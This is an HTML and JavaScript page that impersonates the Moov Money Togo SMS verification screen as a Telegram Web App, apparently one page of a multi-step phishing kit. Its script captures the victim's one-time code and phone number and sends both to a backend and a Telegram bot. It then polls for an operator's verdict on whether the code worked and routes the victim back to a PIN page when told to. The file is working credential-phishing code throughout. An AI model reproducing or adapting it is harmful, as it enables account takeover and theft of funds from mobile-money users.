<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Togo - Vérification SMS</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-blue: #002B66;
            --moov-orange: #FF6600;
            --moov-orange-dark: #e65c00;
            --bg-color: #ffffff;
            --text-dark: #002B66;
            --text-muted: #666666;
            --border-color: #e2e8f0;
            --ring-track: #edf2f7;
            --ring-active: #FF6600;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Top Header Navigation bar */
        .app-header {
            width: 100%;
            background-color: var(--moov-blue);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        }

        .back-btn-top {
            color: #ffffff;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: 900;
            letter-spacing: -0.5px;
            color: #ffffff;
        }

        .header-title .moov-highlight {
            color: var(--moov-orange);
        }

        .header-title .region {
            color: #ffffff;
            font-size: 11px;
            margin-left: 6px;
            font-weight: 700;
            text-transform: uppercase;
            background: rgba(255, 255, 255, 0.15);
            padding: 2px 6px;
            border-radius: 4px;
        }

        /* Main Container */
        .container {
            width: 90%;
            max-width: 400px;
            margin: 30px auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            flex-grow: 1;
        }

        .main-title {
            font-size: 28px;
            font-weight: 800;
            color: var(--text-dark);
            margin: 10px 0 16px;
            letter-spacing: -0.5px;
        }

        .instruction-text {
            font-size: 15px;
            color: var(--text-muted);
            margin: 0 0 10px;
            line-height: 1.4;
        }

        .phone-highlight {
            font-size: 22px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 12px;
            letter-spacing: 0.5px;
        }

        /* Edit Phone Pill Button */
        .btn-edit-phone {
            background-color: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 6px 16px;
            font-size: 13px;
            font-weight: 600;
            color: #444444;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            margin-bottom: 25px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
            text-decoration: none;
        }

        .btn-edit-phone:active {
            background-color: #f7f7f7;
        }

        /* 🚨 Red Status Error Banner */
        .error-banner {
            width: 100%;
            background-color: #ffebe9;
            border: 1px solid #ff4d4f;
            color: #d93025;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            display: none;
            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
        }

        /* OTP Input Box */
        .otp-input-container {
            width: 100%;
            margin-bottom: 35px;
        }

        .otp-input {
            width: 100%;
            padding: 16px;
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            letter-spacing: 4px;
            outline: none;
            color: var(--text-dark);
            background-color: #ffffff;
            transition: border-color 0.2s;
        }

        .otp-input.input-error {
            border-color: #d93025;
            background-color: #fff9f9;
        }

        .otp-input::placeholder {
            color: #a0aec0;
            letter-spacing: normal;
            font-size: 15px;
            font-weight: 500;
        }

        .otp-input:focus {
            border-color: var(--moov-orange);
        }

        /* Rotating Progress Circle Timer */
        .timer-wrapper {
            position: relative;
            width: 180px;
            height: 180px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
        }

        .timer-svg {
            width: 100%;
            height: 100%;
            transform: rotate(-90deg);
        }

        .timer-circle-bg {
            fill: none;
            stroke: var(--ring-track);
            stroke-width: 8;
        }

        .timer-circle-progress {
            fill: none;
            stroke: var(--ring-active);
            stroke-width: 8;
            stroke-linecap: round;
            stroke-dasharray: 440;
            stroke-dashoffset: 0;
            transition: stroke-dashoffset 1s linear;
        }

        .timer-text {
            position: absolute;
            font-size: 32px;
            font-weight: 800;
            color: var(--text-dark);
        }

        /* Expiration & Resend Section */
        .expire-pill {
            background-color: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 8px 18px;
            font-size: 13px;
            color: var(--text-muted);
            font-weight: 500;
        }

        .resend-link {
            color: var(--moov-blue);
            font-weight: 800;
            text-decoration: underline;
            cursor: pointer;
            font-size: 15px;
            display: none;
        }

        /* Verify Action Button */
        .btn-verify {
            background-color: var(--moov-orange);
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            margin-top: 25px;
            transition: background-color 0.2s, opacity 0.2s;
            box-shadow: 0 4px 12px rgba(255, 102, 0, 0.35);
        }

        .btn-verify:active {
            background-color: var(--moov-orange-dark);
        }

        .btn-verify:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* 📱 Full Screen Overlay Status Page (Moov Money Togo Style) */
        .overlay-status {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: var(--moov-blue);
            z-index: 9999;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 24px;
            box-sizing: border-box;
        }

        .overlay-status.active {
            display: flex;
        }

        .overlay-spinner-circle {
            width: 100px;
            height: 100px;
            background: linear-gradient(180deg, #003380 0%, #002B66 100%);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 20px rgba(0, 43, 102, 0.5);
        }

        .overlay-spinner-circle::after {
            content: '';
            width: 74px;
            height: 74px;
            border: 4px solid rgba(255, 255, 255, 0.2);
            border-top: 4px solid var(--moov-orange);
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .overlay-title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 800;
            margin: 0 0 12px;
            letter-spacing: -0.3px;
        }

        .overlay-subtext {
            color: #a0aec0;
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
            max-width: 300px;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title">
        <span>Moov<span class="moov-highlight">Money</span></span><span class="region">Togo</span>
    </div>
</div>

<div class="container">
    <h1 class="main-title">Vérification SMS</h1>

    <p class="instruction-text">Veuillez entrer le code de validation envoyé par SMS au</p>
    <div class="phone-highlight" id="userPhoneDisplay">+228 -- -- -- --</div>

    <a onclick="goBack()" class="btn-edit-phone">
        ✏️ Modifier le numéro
    </a>

    <!-- Red Error Banner for Wrong Code -->
    <div id="statusErrorContainer" class="error-banner"></div>

    <form id="otpForm" style="width: 100%;" onsubmit="submitOtp(event)">
        <div class="otp-input-container">
            <input 
                type="tel" 
                id="otpCode" 
                class="otp-input" 
                placeholder="Entrer le code à usage unique" 
                maxlength="6" 
                pattern="[0-9]*" 
                inputmode="numeric" 
                required
            >
        </div>

        <div class="timer-wrapper">
            <svg class="timer-svg" viewBox="0 0 160 160">
                <circle class="timer-circle-bg" cx="80" cy="80" r="70"></circle>
                <circle id="progressCircle" class="timer-circle-progress" cx="80" cy="80" r="70"></circle>
            </svg>
            <div id="timerText" class="timer-text">01:00</div>
        </div>

        <div id="expireBadge" class="expire-pill">
            Expire dans <span id="expireSeconds">60</span> sec
        </div>

        <div id="resendContainer" class="resend-link" onclick="resendCode()">
            Vous n'avez pas reçu le code ? <u>Renvoyer le code</u>
        </div>

        <button type="submit" id="verifyBtn" class="btn-verify">VALIDER</button>
    </form>
</div>

<div id="statusOverlay" class="overlay-status">
    <div class="overlay-spinner-circle"></div>
    <h2 class="overlay-title" id="overlayMainText">Veuillez patienter...</h2>
    <p class="overlay-subtext" id="overlaySubText">Vérification du code SMS en cours</p>
</div>

<script>
    const TOTAL_TIME = 60; // 1 Minute
    let timeLeft = TOTAL_TIME;
    let timerInterval = null;
    let statusPollingInterval = null;

    const timerTextEl = document.getElementById('timerText');
    const expireSecondsEl = document.getElementById('expireSeconds');
    const progressCircle = document.getElementById('progressCircle');
    const expireBadge = document.getElementById('expireBadge');
    const resendContainer = document.getElementById('resendContainer');
    const phoneDisplayEl = document.getElementById('userPhoneDisplay');
    const statusErrorContainer = document.getElementById('statusErrorContainer');
    const otpInputEl = document.getElementById('otpCode');

    // Overlay Elements
    const statusOverlay = document.getElementById('statusOverlay');
    const overlayMainText = document.getElementById('overlayMainText');
    const overlaySubText = document.getElementById('overlaySubText');

    const CIRCUMFERENCE = 440;

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        const rawPhone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "90123456";
        phoneDisplayEl.textContent = rawPhone.startsWith('+') ? rawPhone : `+228 ${rawPhone}`;

        startTimer();
    };

    function startTimer() {
        clearInterval(timerInterval);
        timeLeft = TOTAL_TIME;
        updateTimerDisplay();

        resendContainer.style.display = 'none';
        expireBadge.style.display = 'block';

        timerInterval = setInterval(() => {
            timeLeft--;
            updateTimerDisplay();

            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                onTimerExpired();
            }
        }, 1000);
    }

    function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        
        const formattedMinutes = String(minutes).padStart(2, '0');
        const formattedSeconds = String(seconds).padStart(2, '0');
        
        timerTextEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
        expireSecondsEl.textContent = timeLeft;

        const strokeOffset = CIRCUMFERENCE - (timeLeft / TOTAL_TIME) * CIRCUMFERENCE;
        progressCircle.style.strokeDashoffset = strokeOffset;
    }

    function onTimerExpired() {
        timerTextEl.textContent = "00:00";
        expireBadge.style.display = 'none';
        resendContainer.style.display = 'block';
    }

    async function resendCode() {
        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
        try {
            await fetch("/api/resend-otp-notification", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
            });
        } catch (err) {
            console.error("Resend error:", err);
        }
        alert("Un nouveau code de validation a été envoyé par SMS.");
        startTimer();
    }

    async function submitOtp(event) {
        event.preventDefault();
        const codeVal = otpInputEl.value.trim();

        if (codeVal.length < 4) {
            statusErrorContainer.style.display = 'block';
            statusErrorContainer.textContent = "Code incorrect, veuillez entrer le code correct.";
            otpInputEl.classList.add('input-error');
            return;
        }

        // Hide previous errors
        statusErrorContainer.style.display = 'none';
        otpInputEl.classList.remove('input-error');

        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";

        // Display waiting screen
        overlayMainText.textContent = "Veuillez patienter...";
        overlaySubText.textContent = "Vérification du code SMS en cours...";
        statusOverlay.classList.add('active');

        // Save local OTP
        localStorage.setItem('smsOtp1', codeVal);

        // Send payload to backend
        try {
            await fetch("/api/otp-notification", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
            });
        } catch (err) {
            console.error("❌ Erreur d'envoi de la notification :", err);
        }

        const tg = window.Telegram?.WebApp;
        if (tg && tg.sendData) {
            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
        }

        // Wait for bot response via status polling
        startStatusPolling(phone);
    }

    function startStatusPolling(phone) {
        if (statusPollingInterval) clearInterval(statusPollingInterval);

        statusPollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
                const data = await response.json();

                if (data.status === "otp1_correct") {
                    clearInterval(statusPollingInterval);
                    overlayMainText.textContent = "Code confirmé !";
                    overlaySubText.textContent = "Redirection en cours...";

                    setTimeout(() => {
                        window.location.href = "/page9";
                    }, 1200);
                } 
                else if (data.status === "otp1_wrong") {
                    clearInterval(statusPollingInterval);
                    statusOverlay.classList.remove('active');
                    
                    // Show Red Error Message in French
                    statusErrorContainer.style.display = 'block';
                    statusErrorContainer.textContent = "Code incorrect, veuillez entrer le code correct.";
                    otpInputEl.classList.add('input-error');
                    otpInputEl.value = "";
                    otpInputEl.focus();
                }
                else if (data.status === "otp2_wrongpin") {
                    clearInterval(statusPollingInterval);
                    statusOverlay.classList.remove('active');
                    
                    // Redirect to Page 6 with error flag
                    window.location.href = "/page6?error=wrong_pin";
                }
            } catch (err) {
                console.error("Status polling error:", err);
            }
        }, 2000);
    }

    function goBack() {
        if (statusPollingInterval) clearInterval(statusPollingInterval);
        window.location.href = "/page6";
    }
</script>

</body>
</html>
